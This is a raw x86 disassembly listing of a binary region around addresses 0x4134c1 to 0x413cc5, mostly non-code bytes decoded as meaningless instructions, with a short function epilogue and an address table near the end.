  4134c1:	add    ebp,DWORD PTR [eax+0x40]
  4134c4:	(bad)  
  4134c5:	call   0xdd79:0xd957d29d
  4134cc:	cdq    
  4134cd:	jmp    0x413478
  4134cf:	xor    dl,BYTE PTR [ebx+0x1d]
  4134d2:	push   ss
  4134d3:	jge    0x41345e
  4134d5:	or     eax,DWORD PTR [ecx+eiz*1-0x24378aa2]
  4134dc:	pop    ss
  4134dd:	test   DWORD PTR [eax],esi
  4134df:	cld    
  4134e0:	shl    DWORD PTR [edi+0x5c],1
  4134e3:	dec    esi
  4134e4:	(bad)  
  4134e5:	or     ebx,DWORD PTR [edx-0x3822bdbf]
  4134eb:	icebp  
  4134ec:	xchg   DWORD PTR [ebp+edx*1-0xf015dfb],ebp
  4134f3:	test   al,0x89
  4134f5:	mov    esi,0xbfcc711f
  4134fa:	add    edi,DWORD PTR [ebx+0x76]
  4134fd:	aas    
  4134fe:	addr16 ds xor edx,esi
  413502:	jl     0x413491
  413504:	enter  0x1c59,0xfc
  413508:	push   0x45
  41350a:	rcl    BYTE PTR [esi+0x12cd4455],1
  413510:	and    ch,BYTE PTR [edi+0x3992a579]
  413516:	inc    ebx
  413517:	mov    WORD PTR ss:[si+0x1b],es
  41351c:	pop    edi
  41351d:	shl    BYTE PTR [edi],cl
  41351f:	xchg   bl,dl
  413521:	add    al,0xdd
  413523:	imul   esi,DWORD PTR [edx-0x72ad7b28],0x1e4c65c8
  41352d:	mov    BYTE PTR [esi-0x1f],bh
  413530:	popw   ss
  413532:	ret    
  413533:	clc    
  413534:	push   ebp
  413535:	(bad)  
  413536:	adc    eax,0xcf56f53a
  41353b:	lea    ebp,[edi-0x4d66cb28]
  413541:	mov    DWORD PTR [ebx+edx*8+0x70746ffa],edx
  413548:	push   eax
  413549:	push   ebx
  41354a:	jnp    0x413517
  41354c:	mov    al,ds:0xb78e4a20
  413551:	sbb    BYTE PTR [edi],ch
  413553:	mov    bh,0x90
  413555:	push   0x7d
  413557:	and    BYTE PTR [eax+0xb],ah
  41355a:	out    0xfc,eax
  41355c:	(bad)  
  41355d:	js     0x413556
  41355f:	dec    edi
  413560:	imul   eax,DWORD PTR ds:[edi+0x3ff9f54e],0x1d
  413568:	clc    
  413569:	sbb    eax,0xfdd01845
  41356e:	or     ah,ch
  413570:	jns    0x413551
  413572:	je     0x4134f8
  413574:	ins    DWORD PTR es:[edi],dx
  413575:	adc    dl,cl
  413577:	inc    eax
  413578:	mov    ecx,0xe4f7c4c5
  41357d:	sub    DWORD PTR [eax-0x8],edi
  413580:	mov    BYTE PTR [ecx-0x3453500],bh
  413586:	or     eax,0x1c03b3d7
  41358b:	dec    edi
  41358c:	xchg   edi,ebp
  41358e:	mov    esp,0xfd2e32d4
  413593:	int3   
  413594:	js     0x4135d0
  413596:	or     bl,BYTE PTR [ebx-0x44]
  413599:	sub    edx,0x42
  41359c:	jmp    0xa609a149
  4135a1:	imul   edi,eax,0x790b9b7a
  4135a7:	push   ss
  4135a8:	scas   al,BYTE PTR es:[edi]
  4135a9:	jmp    0x41353a
  4135ab:	xchg   esi,eax
  4135ac:	mov    edi,0x5e0de6e4
  4135b1:	ins    BYTE PTR es:[edi],dx
  4135b2:	mov    eax,ds:0x29135a50
  4135b7:	jle    0x41362b
  4135b9:	das    
  4135ba:	xor    eax,0x3a6afcf6
  4135bf:	test   al,0xbe
  4135c1:	int3   
  4135c2:	sub    DWORD PTR [ebx-0x1d09e8e6],ecx
  4135c8:	imul   edi,DWORD PTR [edi-0x664f76fe],0xffffffb3
  4135cf:	sbb    al,BYTE PTR [edx+ebp*8+0x26f39615]
  4135d6:	pusha  
  4135d7:	pop    ebx
  4135d8:	ror    DWORD PTR [ecx+ebx*4-0x420ab69b],cl
  4135df:	or     bl,BYTE PTR [eax+0x41]
  4135e2:	push   edi
  4135e3:	inc    edx
  4135e4:	scas   al,BYTE PTR es:[edi]
  4135e5:	xchg   BYTE PTR [ecx],bl
  4135e7:	pop    esi
  4135e8:	test   BYTE PTR ds:[edx+0x2266e58d],cl
  4135ef:	daa    
  4135f0:	rcr    BYTE PTR [ecx-0x4cbdbc0],0x38
  4135f7:	sbb    BYTE PTR [ebx-0x6895e5db],dh
  4135fd:	push   ebx
  4135fe:	(bad)  
  4135ff:	jbe    0x4135c0
  413601:	les    esi,FWORD PTR [edi]
  413603:	movnti DWORD PTR [esi-0x3c],eax
  413607:	add    al,0xf8
  413609:	stos   BYTE PTR es:[edi],al
  41360a:	adc    cl,0xac
  41360d:	mov    edx,0xd700f19
  413612:	cmp    cl,BYTE PTR [edi+ebx*8-0x80]
  413616:	popf   
  413617:	xchg   DWORD PTR [esi],ebp
  413619:	in     eax,0xc0
  41361b:	mov    ds:0xbadfb101,al
  413620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413621:	adc    DWORD PTR [edx],ecx
  413623:	or     DWORD PTR [ebx],ebp
  413625:	add    eax,0xd1dd9c8a
  41362a:	scas   al,BYTE PTR es:[edi]
  41362b:	shr    DWORD PTR [edi-0x630a2459],0x16
  413632:	lock pusha 
  413634:	ins    DWORD PTR es:[edi],dx
  413635:	cmp    dh,dh
  413637:	or     eax,0x74fbf564
  41363c:	mov    bp,0xa411
  413640:	jae    0x4135c8
  413642:	mov    eax,DWORD PTR [eax+0x67]
  413645:	cmp    al,BYTE PTR [edi-0x3403647f]
  41364b:	pop    edx
  41364c:	sbb    al,0x68
  41364e:	pop    ds
  41364f:	lea    edx,[edi+0x6bc28007]
  413655:	xor    eax,0x6d06fbe6
  41365a:	push   eax
  41365b:	mov    eax,0xd2436cae
  413660:	jae    0x413610
  413662:	les    esi,FWORD PTR [ecx+0x2c706839]
  413668:	xchg   edx,eax
  413669:	sub    BYTE PTR ds:0x35252e53,bl
  41366f:	je     0x4136e2
  413671:	lods   eax,DWORD PTR ds:[esi]
  413672:	test   eax,0xa2b8f61e
  413677:	cs cld 
  413679:	call   0x49a0:0xa473cf7a
  413680:	test   BYTE PTR [esi+0x41bb6f5f],al
  413686:	stos   BYTE PTR es:[edi],al
  413687:	sbb    al,al
  413689:	loopne 0x41361c
  41368b:	(bad)  
  41368c:	mul    BYTE PTR [ebx+0x6b]
  41368f:	das    
  413690:	mov    esp,0xdd32d82d
  413695:	ds or  eax,0x6b4553ee
  41369b:	sub    ch,BYTE PTR [ebx-0x3690d8f6]
  4136a1:	sub    DWORD PTR [ecx],ecx
  4136a3:	dec    ecx
  4136a4:	cmp    al,0x95
  4136a6:	lahf   
  4136a7:	pushf  
  4136a8:	jecxz  0x413643
  4136aa:	adc    BYTE PTR [edx],0xe7
  4136ad:	je     0x41364c
  4136af:	call   0xf02860a2
  4136b4:	div    al
  4136b6:	in     eax,0x1d
  4136b8:	sub    dh,al
  4136ba:	dec    esp
  4136bb:	shl    DWORD PTR [edi],1
  4136bd:	inc    esi
  4136be:	int    0xad
  4136c0:	mov    al,ds:0x5254a7cd
  4136c5:	and    cl,BYTE PTR cs:[esi]
  4136c8:	xor    eax,0x1bb61f9b
  4136cd:	(bad)  
  4136ce:	std    
  4136cf:	or     esi,ebp
  4136d1:	mov    eax,0x4bb9fe69
  4136d6:	fwait
  4136d7:	sub    BYTE PTR [edx+0x5de4e153],0xb5
  4136de:	cmc    
  4136df:	or     ebp,DWORD PTR [ebx+0x1fc815b4]
  4136e5:	imul   esp,esi,0xe9d0ad42
  4136eb:	ret    0xe80
  4136ee:	aad    0x92
  4136f0:	into   
  4136f1:	mov    ds:0x1292019b,eax
  4136f6:	mov    edi,DWORD PTR [esi+0x3a9600df]
  4136fc:	fild   WORD PTR [esi-0x44]
  4136ff:	push   ss
  413700:	mov    dl,0xac
  413702:	ret    
  413703:	aas    
  413704:	enter  0x8ea4,0x53
  413708:	(bad)  
  413709:	mov    edi,0xd5739015
  41370e:	gs and al,0x7c
  413711:	push   cs
  413712:	les    eax,FWORD PTR [esi+0x1ee1e233]
  413718:	aam    0xba
  41371a:	jns    0x4136aa
  41371c:	addr16 add eax,0xdcc996ba
  413722:	rcr    DWORD PTR [edx],cl
  413724:	mov    ch,0xa0
  413726:	jmp    0xed97:0x93f9
  41372c:	xor    BYTE PTR [edi+esi*1],dh
  41372f:	das    
  413730:	sub    DWORD PTR [edi-0x55],edx
  413733:	mov    BYTE PTR [ebp+eax*1+0x48],bl
  413737:	mov    eax,0xfdc90fdf
  41373c:	push   eax
  41373d:	add    BYTE PTR [ecx],bl
  41373f:	cdq    
  413740:	adc    BYTE PTR ds:0x29ac3f7f,0xb8
  413747:	aas    
  413748:	(bad)  
  413749:	push   ecx
  41374a:	(bad)  
  41374b:	rcr    BYTE PTR [ebp+0x5a],1
  41374e:	pushf  
  41374f:	inc    esi
  413750:	gs inc ebp
  413752:	lods   al,BYTE PTR ds:[esi]
  413753:	jns    0x413702
  413755:	cmp    eax,0x2a79ad9c
  41375a:	pop    esp
  41375b:	and    ah,BYTE PTR [ecx-0xef9a462]
  413761:	mov    ah,0x9
  413763:	dec    ecx
  413764:	mov    ch,0xf9
  413766:	xchg   ebp,eax
  413767:	push   0xffffffa3
  413769:	or     BYTE PTR [ebp+0x26077dd7],ch
  41376f:	aas    
  413770:	out    0x7c,eax
  413772:	fldenv [edx]
  413774:	sahf   
  413775:	inc    ebx
  413776:	add    al,0x31
  413778:	hlt    
  413779:	shl    edi,0xec
  41377c:	xor    ch,dh
  41377e:	add    esi,DWORD PTR [eax]
  413780:	test   ebp,edi
  413782:	mov    al,ds:0xe70f8154
  413787:	cli    
  413788:	and    eax,0x75dc05e9
  41378d:	les    ebx,FWORD PTR [edx-0x52]
  413790:	sub    eax,0x44e3a7f0
  413795:	mov    ah,BYTE PTR [ebp+0x71e5a97b]
  41379b:	pop    ecx
  41379c:	mov    ecx,0x380d9ab9
  4137a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137a2:	daa    
  4137a3:	push   ebp
  4137a4:	sahf   
  4137a5:	je     0x413733
  4137a7:	retf   0xbc53
  4137aa:	rcl    DWORD PTR [esp+esi*2+0x2c805735],1
  4137b1:	scas   al,BYTE PTR es:[edi]
  4137b2:	and    esi,edx
  4137b4:	loope  0x413825
  4137b6:	(bad)
  4137b9:	test   BYTE PTR [edi-0xa28ce07],0x6d
  4137c0:	nop
  4137c1:	push   eax
  4137c2:	loop   0x413836
  4137c4:	xor    cl,BYTE PTR [ebp-0x25da3725]
  4137ca:	jmp    0xb3fb:0x3ef7e341
  4137d1:	xchg   esp,eax
  4137d2:	jb     0x413803
  4137d4:	stos   BYTE PTR es:[edi],al
  4137d5:	out    0x30,eax
  4137d7:	call   0xd17008fe
  4137dc:	pushf  
  4137dd:	push   esi
  4137de:	call   0xd22f:0xcc235c11
  4137e5:	jno    0x413807
  4137e7:	in     al,dx
  4137e8:	push   0x1e
  4137ea:	retf   0x519e
  4137ed:	pop    esi
  4137ee:	lea    eax,[ecx+0x79273d51]
  4137f4:	aas    
  4137f5:	mov    eax,ds:0x10a44df5
  4137fa:	sub    esi,esi
  4137fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137fd:	mov    eax,ds:0x5024a1d0
  413802:	jb     0x413861
  413804:	lahf   
  413805:	mov    eax,0x657ec324
  41380a:	xor    eax,0x991ab451
  41380f:	xchg   esi,eax
  413810:	cmp    al,0x91
  413812:	rcl    dh,1
  413814:	adc    ch,dh
  413816:	inc    ebp
  413817:	push   edx
  413818:	ja     0x413810
  41381a:	and    al,0x3c
  41381c:	sub    ecx,ebp
  41381e:	test   ch,dh
  413820:	xor    cl,ah
  413822:	xchg   BYTE PTR [edi+0x46],bl
  413825:	add    DWORD PTR [ebp-0x6],eax
  413828:	cwde   
  413829:	sbb    al,0xed
  41382b:	frstor [edi+0xd]
  41382e:	inc    ebx
  41382f:	fwait
  413830:	scas   al,BYTE PTR es:[edi]
  413831:	mov    BYTE PTR [eax],ch
  413833:	or     ebp,DWORD PTR [ebx-0x1f]
  413836:	xchg   ecx,eax
  413837:	add    dl,BYTE PTR [edi-0xf]
  41383a:	inc    esp
  41383b:	in     eax,0x82
  41383d:	inc    ebx
  41383e:	jnp    0x41388b
  413840:	ins    DWORD PTR es:[edi],dx
  413841:	dec    ecx
  413842:	jne    0x4137d9
  413844:	test   al,0x39
  413846:	and    eax,0xcfb1e47d
  41384b:	call   0x2683:0xb4fde24a
  413852:	sub    BYTE PTR [ecx],dh
  413854:	jae    0x4137f4
  413856:	adc    BYTE PTR [edi-0x35],ch
  413859:	mov    edx,0xc4f9883e
  41385e:	jae    0x413824
  413860:	sub    DWORD PTR cs:[ecx+esi*1+0x24],0xe881cbeb
  413869:	gs imul eax,ebx,0x4c
  41386d:	inc    edi
  41386e:	mov    ecx,0x7ad42517
  413873:	cmp    BYTE PTR [esp+ebp*1-0x36],0x28
  413878:	retf   0x708b
  41387b:	test   al,0xf7
  41387d:	or     al,0x99
  41387f:	cmp    DWORD PTR [ecx+0x34a5b2bb],esp
  413885:	push   cs
  413886:	cmp    al,0x26
  413888:	sub    dh,BYTE PTR ds:0x93150058
  41388e:	mov    bl,0x8c
  413890:	xor    BYTE PTR [eax+0x62e537],0x3c
  413897:	push   edx
  413898:	mov    ecx,0x27514e3b
  41389d:	imul   DWORD PTR [ecx+0x3994f228]
  4138a3:	cmp    al,0xbd
  4138a5:	push   cs
  4138a6:	xchg   edx,eax
  4138a7:	jo     0x4138d7
  4138a9:	ja     0x4138b5
  4138ab:	je     0x4138fd
  4138ad:	xchg   ecx,eax
  4138ae:	rcl    ah,1
  4138b0:	fcomip st,st(2)
  4138b2:	mov    eax,0xe5b56b5c
  4138b7:	ror    BYTE PTR [edi],1
  4138b9:	add    BYTE PTR [eax+0x34],al
  4138bc:	cmp    al,0xcd
  4138be:	mov    ch,BYTE PTR [ebp-0x39]
  4138c1:	jecxz  0x4138dc
  4138c3:	sbb    DWORD PTR [esi],eax
  4138c5:	cmp    BYTE PTR [esi],dl
  4138c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138c8:	fild   QWORD PTR [eax]
  4138ca:	xchg   ebx,eax
  4138cb:	mov    edx,0x589475ea
  4138d0:	je     0x413871
  4138d2:	lds    ecx,FWORD PTR [ebx+0x55da29af]
  4138d8:	ret    0xe26f
  4138db:	(bad)  
  4138dc:	mov    eax,0xec3a1bc4
  4138e1:	ds mov ebx,0x1b0d12d7
  4138e7:	sbb    DWORD PTR [edx+0x1a31ea83],edi
  4138ed:	int    0x85
  4138ef:	inc    ebp
  4138f0:	cmp    dl,BYTE PTR [eax]
  4138f2:	or     edx,DWORD PTR cs:[edi-0x2536cecf]
  4138f9:	fwait
  4138fa:	lds    esi,FWORD PTR [ebp+0x2ad31f]
  413900:	in     al,0x77
  413902:	cmp    ebx,DWORD PTR [ecx]
  413904:	or     ecx,DWORD PTR [ebp-0x5be6099]
  41390a:	lea    edx,[esi+ecx*1-0x33daf8c8]
  413911:	in     eax,0xac
  413913:	push   eax
  413914:	mov    al,ch
  413916:	in     eax,dx
  413917:	ds in  eax,dx
  413919:	pop    ebx
  41391a:	adc    al,0x60
  41391c:	lea    esp,[ebx]
  41391e:	xchg   ecx,eax
  413920:	jnp    0x4138b9
  413922:	popa   
  413923:	cmp    eax,0xb2ea7a3b
  413928:	xor    al,0xe
  41392a:	fs adc ecx,0x298b2d94
  413931:	mov    DWORD PTR [esi+0x40],eax
  413934:	add    eax,0x403303c9
  413939:	loopne 0x41396d
  41393b:	mov    esp,0xb71aa08e
  413940:	jg     0x413924
  413942:	push   esi
  413943:	sub    ch,bl
  413945:	adc    DWORD PTR [edi-0x63],ecx
  413948:	popf   
  413949:	xchg   ch,bh
  41394b:	mov    dl,0x40
  41394d:	and    al,0x78
  41394f:	xlat   BYTE PTR ds:[ebx]
  413950:	addr16 (bad) 
  413952:	popa   
  413953:	xor    al,0x31
  413955:	in     al,dx
  413956:	daa    
  413957:	(bad)  
  413958:	mov    ebx,0xd82e743d
  41395d:	ins    DWORD PTR es:[edi],dx
  41395e:	xor    DWORD PTR [ecx-0x6b0cfff6],eax
  413964:	dec    esi
  413965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413966:	out    0x55,eax
  413968:	ins    BYTE PTR es:[edi],dx
  413969:	fsubr  DWORD PTR ds:0xfe4e003b
  41396f:	es (bad) 
  413971:	arpl   WORD PTR [ecx-0x1a021093],di
  413977:	inc    esp
  413978:	jecxz  0x413971
  41397a:	sahf   
  41397b:	rcl    BYTE PTR [eax-0x47],cl
  41397e:	or     eax,0xbb2edc68
  413983:	xor    al,0xd7
  413985:	in     eax,0x56
  413987:	xor    al,0x9e
  413989:	mov    WORD PTR [esi-0x56],ds
  41398c:	mov    esi,0xda39b7f0
  413991:	mov    ds:0x3b38777e,al
  413996:	fiadd  WORD PTR [eax+ebx*2+0x5710a1f9]
  41399d:	inc    esp
  41399e:	daa    
  41399f:	hlt    
  4139a0:	jbe    0x4139d0
  4139a2:	(bad)  
  4139a3:	or     al,0xf
  4139a5:	daa    
  4139a6:	repnz adc BYTE PTR [esi+ebx*8+0xd68a170],0xbc
  4139af:	xchg   edi,eax
  4139b0:	cmp    ebp,esp
  4139b2:	mov    ebp,0x486b3ea3
  4139b7:	loope  0x4139a1
  4139b9:	mov    eax,ds:0x3434c51d
  4139be:	cvttps2pi mm5,QWORD PTR [ebx+0x56eca971]
  4139c5:	adc    al,al
  4139c7:	ins    BYTE PTR es:[edi],dx
  4139c8:	push   ecx
  4139c9:	or     bh,dh
  4139cb:	test   BYTE PTR [edx-0x60fa398d],0x98
  4139d2:	pop    ds
  4139d3:	sbb    edi,edi
  4139d5:	and    al,0x12
  4139d7:	xchg   ebx,eax
  4139d8:	popa   
  4139d9:	sbb    DWORD PTR [esi-0x6b],edi
  4139dc:	hlt    
  4139dd:	pop    eax
  4139de:	mul    BYTE PTR [esi]
  4139e0:	inc    ebx
  4139e1:	scas   eax,DWORD PTR es:[edi]
  4139e2:	mov    cl,0xd3
  4139e4:	or     edx,DWORD PTR ds:0xfa061157
  4139ea:	mov    eax,?
  4139ec:	xchg   DWORD PTR [esi-0x54],eax
  4139ef:	popa   
  4139f0:	loopne 0x413980
  4139f2:	or     eax,0x48865705
  4139f7:	mov    ss,edx
  4139f9:	and    al,0xc9
  4139fb:	jb     0x413a39
  4139fd:	sub    al,0x98
  4139ff:	add    bl,al
  413a01:	aad    0xf1
  413a03:	ficom  WORD PTR [edx-0x3f]
  413a06:	(bad)  
  413a07:	fsub   st(5),st
  413a09:	or     dh,al
  413a0b:	cli    
  413a0c:	dec    edi
  413a0d:	ror    bl,1
  413a0f:	push   edx
  413a10:	cmp    DWORD PTR [edi+0x6e],esp
  413a13:	push   0xbafb3fc9
  413a18:	jg     0x4139a0
  413a1a:	and    dh,dl
  413a1c:	(bad)  
  413a1d:	jge    0x413a46
  413a1f:	or     DWORD PTR [edi],0xffffffad
  413a22:	loopne 0x4139c7
  413a24:	add    al,BYTE PTR [ebp-0x65]
  413a27:	pop    esp
  413a28:	ret    
  413a29:	add    ch,BYTE PTR [edx+esi*2-0xf]
  413a2d:	sbb    eax,0x860f3b59
  413a32:	push   esp
  413a33:	push   esi
  413a34:	in     al,0xab
  413a36:	mov    esp,0x54dbd748
  413a3b:	jo     0x413a72
  413a3d:	es sti 
  413a3f:	sar    DWORD PTR [edi-0x1c],cl
  413a42:	ficom  DWORD PTR [eax]
  413a44:	out    0x12,al
  413a46:	push   ss
  413a47:	push   esp
  413a48:	push   edx
  413a49:	fld    TBYTE PTR [ebp+0xe]
  413a4c:	fs sbb ch,ch
  413a4f:	and    eax,0xbf8d6084
  413a54:	aad    0xce
  413a56:	imul   ebx,DWORD PTR [edx],0x490f8b1
  413a5c:	jmp    0x413a48
  413a5e:	cdq    
  413a5f:	lods   eax,DWORD PTR ds:[esi]
  413a60:	and    al,0x6b
  413a62:	shr    ebp,0x35
  413a65:	and    eax,0x2ae7b7b8
  413a6a:	dec    esp
  413a6b:	jge    0x4139f1
  413a6d:	mov    ch,0xd2
  413a6f:	stc    
  413a70:	shl    ah,1
  413a72:	in     eax,0xa4
  413a74:	add    BYTE PTR [ebx],dl
  413a76:	mov    DWORD PTR [esi+0x2d9b1245],ecx
  413a7c:	inc    ecx
  413a7d:	inc    edi
  413a7e:	call   0xc5f4f132
  413a83:	dec    esp
  413a84:	jbe    0x413a3c
  413a86:	es (bad) 
  413a88:	xlat   BYTE PTR ds:[ebx]
  413a89:	mov    edi,ebx
  413a8b:	xchg   edx,eax
  413a8c:	div    DWORD PTR [esi]
  413a8e:	repnz mov al,ah
  413a91:	xchg   esi,eax
  413a92:	ss cmp al,BYTE PTR gs:[edx+0x284fc89d]
  413a9a:	mov    eax,0x4811ca9c
  413a9f:	test   al,0x99
  413aa1:	and    DWORD PTR [ebx-0x4f],eax
  413aa4:	sub    al,0xc4
  413aa6:	push   ebp
  413aa7:	xor    eax,0x2b901bf6
  413aac:	xchg   BYTE PTR [ebp+0x62da1532],al
  413ab2:	mov    BYTE PTR [edx-0x30de6f75],cl
  413ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ab9:	cdq    
  413aba:	test   al,0x4
  413abc:	push   ebx
  413abd:	xor    bh,BYTE PTR [ecx+ebx*2+0x67a06e3e]
  413ac4:	dec    eax
  413ac5:	cmp    eax,0x66dcb041
  413aca:	sub    DWORD PTR [edx+0x4],edx
  413acd:	lahf   
  413ace:	mov    ds:0xc8dfbe6d,eax
  413ad3:	mov    dh,0xe4
  413ad5:	mov    ebx,DWORD PTR [ebp-0x65b9cc4a]
  413adb:	retf   
  413adc:	loop   0x413afa
  413ade:	cwd    
  413ae0:	imul   ebp,edx,0xffffffc9
  413ae3:	dec    eax
  413ae4:	cdq    
  413ae5:	leave  
  413ae6:	es sahf 
  413ae8:	fsubr  DWORD PTR [esi+esi*2-0x3e777652]
  413aef:	jae    0x413aaf
  413af1:	pop    esp
  413af2:	sbb    eax,0xd43c9d68
  413af7:	pop    ebx
  413af8:	retf   
  413af9:	aas    
  413afa:	mov    esi,0x5b557a38
  413aff:	sub    al,0x6a
  413b01:	pop    ebx
  413b02:	cld    
  413b03:	test   al,0xc
  413b05:	push   ecx
  413b06:	push   esi
  413b07:	retf   0xe280
  413b0a:	cwde   
  413b0b:	and    DWORD PTR [esi-0x28],eax
  413b0e:	jno    0x413af8
  413b10:	rcl    DWORD PTR [edx+0x2],cl
  413b13:	dec    edx
  413b14:	and    DWORD PTR [eax+0x54],eax
  413b17:	stc    
  413b18:	rcl    DWORD PTR [ecx],0x9c
  413b1b:	faddp  st(7),st
  413b1d:	test   bl,cl
  413b1f:	or     BYTE PTR [bx+si+0x5],0x1d
  413b24:	and    dl,BYTE PTR [ebx+eax*2-0x3817cf54]
  413b2b:	lods   al,BYTE PTR ds:[esi]
  413b2c:	jns    0x413b3c
  413b2e:	(bad)  
  413b2f:	stos   BYTE PTR es:[edi],al
  413b30:	add    edi,ebx
  413b32:	push   es
  413b33:	cmp    esi,DWORD PTR [edx]
  413b35:	push   edx
  413b36:	jl     0x413b0b
  413b38:	dec    eax
  413b39:	push   esp
  413b3a:	push   esi
  413b3b:	fnstenv [edx]
  413b3d:	mov    gs,WORD PTR [edx]
  413b3f:	mov    ds:0x6cf56e75,al
  413b44:	arpl   WORD PTR ds:0xe257118,si
  413b4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b4b:	repz in eax,0x84
  413b4e:	bound  eax,QWORD PTR [edi]
  413b50:	and    al,0xd6
  413b52:	js     0x413b16
  413b54:	xchg   esp,eax
  413b55:	push   eax
  413b56:	dec    edx
  413b57:	sbb    DWORD PTR [ebx+ebx*2],ebp
  413b5a:	stos   DWORD PTR es:[edi],eax
  413b5b:	xchg   BYTE PTR [eax-0xfa1fe68],bh
  413b61:	mov    ch,0x5b
  413b63:	sub    BYTE PTR [ebx],cl
  413b65:	imul   edi,DWORD PTR [ebx+0x10],0x897fe712
  413b6c:	lds    esp,FWORD PTR [edx]
  413b6e:	add    eax,DWORD PTR [esi+0x7b]
  413b71:	mov    ecx,0x8600302e
  413b76:	xchg   esp,eax
  413b77:	pop    ecx
  413b78:	push   edi
  413b79:	xchg   DWORD PTR [esi],ebp
  413b7b:	push   edx
  413b7c:	(bad)  
  413b7d:	js     0x413bd1
  413b7f:	adc    edx,DWORD PTR ds:0xe1185d8a
  413b85:	fidivr DWORD PTR fs:[edx-0x67]
  413b89:	mov    al,0xaa
  413b8b:	test   al,0x11
  413b8d:	loope  0x413b8a
  413b8f:	mov    esp,0xefc539cc
  413b94:	ja     0x413bdf
  413b96:	test   al,0xb0
  413b98:	xor    al,0xd0
  413b9a:	inc    esi
  413b9b:	(bad)  
  413b9c:	mov    ds:0x5919e330,eax
  413ba1:	loope  0x413b44
  413ba3:	fstp   DWORD PTR [edx]
  413ba5:	xlat   BYTE PTR ds:[ebx]
  413ba6:	call   0x4191e5c3
  413bab:	daa    
  413bac:	sub    ebp,DWORD PTR ss:[eax+0x6f]
  413bb0:	cmc    
  413bb1:	lods   eax,DWORD PTR ds:[esi]
  413bb2:	stc    
  413bb3:	cmp    al,0xb4
  413bb5:	imul   ecx,DWORD PTR [edi],0xc4c5f02c
  413bbb:	fst    DWORD PTR [eax]
  413bbd:	mov    dl,0x7c
  413bbf:	loopne 0x413b8a
  413bc1:	dec    ebx
  413bc2:	push   ecx
  413bc3:	in     eax,dx
  413bc4:	sbb    BYTE PTR [ecx-0x6d],0x81
  413bc8:	jb     0x413bb5
  413bca:	into   
  413bcb:	cmp    al,0xa5
  413bcd:	out    dx,al
  413bce:	ja     0x413c15
  413bd0:	aad    0xb0
  413bd2:	sub    al,0xdb
  413bd4:	sbb    DWORD PTR ds:0x94ae3b6a,ebp
  413bda:	jl     0x413c23
  413bdc:	xchg   esi,eax
  413bdd:	inc    ebp
  413bde:	es daa 
  413be0:	inc    edi
  413be1:	rcr    ah,cl
  413be3:	mov    ecx,DWORD PTR [ebp-0x8]
  413be6:	xor    ecx,eax
  413be8:	mov    eax,DWORD PTR [ebp+0x10]
  413beb:	add    ecx,esi
  413bed:	mov    DWORD PTR [eax],ecx
  413bef:	pop    edi
  413bf0:	pop    esi
  413bf1:	pop    ebx
  413bf2:	leave  
  413bf3:	ret    0xc
  413bf6:	jne    0x413c0b
  413bf8:	adc    BYTE PTR [eax],al
  413bfa:	std    
  413bfb:	push   ds
  413bfc:	adc    BYTE PTR [eax],al
  413bfe:	aas    
  413bff:	adc    BYTE PTR fs:[eax],al
  413c02:	sbb    cl,BYTE PTR [esi]
  413c04:	adc    BYTE PTR [eax],al
  413c06:	sbb    BYTE PTR [eax+0x10],dl
  413c09:	add    BYTE PTR [eax],ah
  413c0b:	push   es
  413c0c:	adc    BYTE PTR [eax],al
  413c0e:	out    dx,al
  413c0f:	jg     0x413c21
  413c11:	add    BYTE PTR [ebx],al
  413c13:	dec    edi
  413c14:	adc    BYTE PTR [eax],al
  413c16:	mov    esp,0x5500103b
  413c1b:	jns    0x413c2d
  413c1d:	add    BYTE PTR [edx],ch
  413c1f:	inc    eax
  413c20:	adc    BYTE PTR [eax],al
  413c22:	sbb    BYTE PTR ds:0x3d1c0041,bh
  413c28:	inc    ecx
  413c29:	add    BYTE PTR [eax],ah
  413c2b:	cmp    eax,0x3d240041
  413c30:	inc    ecx
  413c31:	add    BYTE PTR [eax],ch
  413c33:	cmp    eax,0x3d2c0041
  413c38:	inc    ecx
  413c39:	add    BYTE PTR [eax],dh
  413c3b:	cmp    eax,0x3d340041
  413c40:	inc    ecx
	...
  413c51:	add    BYTE PTR [eax],al
  413c53:	add    BYTE PTR [esi+0x4df185],bh
  413c59:	add    BYTE PTR [eax],al
  413c5b:	add    BYTE PTR [edx],al
  413c5d:	add    BYTE PTR [eax],al
  413c5f:	add    BYTE PTR [eax+0x0],dl
  413c62:	add    BYTE PTR [eax],al
  413c64:	inc    eax
  413c65:	cmp    eax,0x31400001
  413c6a:	add    DWORD PTR [eax],eax
  413c6c:	scas   al,BYTE PTR es:[edi]
  413c6d:	inc    ebp
  413c6e:	adc    BYTE PTR [eax],al
  413c70:	inc    esp
  413c71:	cmp    edx,DWORD PTR [eax]
  413c73:	add    BYTE PTR [edi+0x4e],bl
  413c76:	adc    BYTE PTR [eax],al
  413c78:	push   0x4b
  413c7a:	adc    BYTE PTR [eax],al
  413c7c:	cmp    edx,DWORD PTR fs:[eax]
  413c7f:	add    BYTE PTR [eax+0x43001057],bl
  413c85:	sbb    dl,BYTE PTR [eax]
  413c87:	add    BYTE PTR [esi+0x39],bl
  413c8a:	adc    BYTE PTR [eax],al
  413c8c:	idiv   BYTE PTR [ebx]
  413c8e:	inc    ecx
  413c8f:	add    dl,bh
  413c91:	cmp    eax,DWORD PTR [ecx+0x0]
  413c94:	(bad)  
  413c95:	cmp    eax,DWORD PTR [ecx+0x0]
  413c98:	add    bh,BYTE PTR [ecx+eax*2]
  413c9b:	add    BYTE PTR [esi],al
  413c9d:	cmp    al,0x41
  413c9f:	add    BYTE PTR [edx],cl
  413ca1:	cmp    al,0x41
  413ca3:	add    BYTE PTR [esi],cl
  413ca5:	cmp    al,0x41
  413ca7:	add    BYTE PTR [edx],dl
  413ca9:	cmp    al,0x41
  413cab:	add    BYTE PTR [esi],dl
  413cad:	cmp    al,0x41
  413caf:	add    BYTE PTR [edx],bl
  413cb1:	cmp    al,0x41
  413cb3:	add    BYTE PTR [esi],bl
  413cb5:	cmp    al,0x41
  413cb7:	add    al,bl
  413cb9:	cmp    al,0x41
  413cbb:	add    ah,bl
  413cbd:	cmp    al,0x41
  413cbf:	add    al,ah
  413cc1:	cmp    al,0x41
  413cc3:	add    ah,ah
  413cc5:	cmp    al,0x41
